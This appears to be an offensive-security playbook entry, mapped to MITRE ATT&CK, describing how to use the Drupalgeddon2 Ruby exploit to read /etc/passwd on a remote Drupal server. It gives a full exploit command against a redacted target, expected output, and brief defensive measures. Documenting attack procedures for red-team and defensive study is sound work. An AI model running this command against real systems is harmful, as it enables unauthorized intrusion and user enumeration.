---
id: proc-003
tags:
  - rce
  - file-read
  - collection
  - drupal
type: procedure
tools:
  - '[[tools/ruby]]'
  - '[[tools/drupalgeddon2-customizable-beta-rb]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/ruby-drupalgeddon2-cat-passwd]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
  - '[[Data from Local System]]'
updated_at: '2025-12-14T17:23:36.692Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
  - '[[Data from Local System]]'
---
# Execute-RCE-to-Read-Etc-Passwd

## Summary

This procedure uses the Drupalgeddon2 exploit to read the /etc/passwd file via RCE, exposing system user accounts and demonstrating data exfiltration potential.

## Description

Building on initial RCE confirmation, this extends the exploit to file access, leveraging the same form injection vector. It targets Linux-based Drupal servers running as apache, allowing enumeration of users for further attacks. Expected outcome: Full contents of the passwd file.

## Requirements

1. Successful prior RCE execution
2. Target URL accessible
3. Ruby and exploit script ready

## Defense

Defensive measures and detection strategies:

- File integrity monitoring on /etc/passwd
- Log anomalous command executions in Apache/PHP
- Apply Drupal security patches promptly

## Objectives

1. Exfiltrate sensitive configuration data
2. Enumerate system users
3. Assess server compromise depth

## Instructions

### Step 1: Inject and Execute File Read Command

**Context**: Use the exploit to run 'cat /etc/passwd' on the remote server.

**Command** ([[commands/ruby-drupalgeddon2-cat-passwd]]):
```bash
ruby drupalgeddon2-customizable-beta.rb -u https://www.██████/ -v 7 -c "cat /etc/passwd" --form user/login
```

> Script injects the command via form API flaws. Expected output: User list including root:x:0:0:root:/root:/bin/bash, daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin, etc.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]
- [[Data from Local System]]

### Sub-Techniques


## Commands Used

- [[commands/ruby-drupalgeddon2-cat-passwd]]

## Tools Used

- [[tools/ruby]]
- [[tools/drupalgeddon2-customizable-beta-rb]]

## Tags

- rce
- file-access
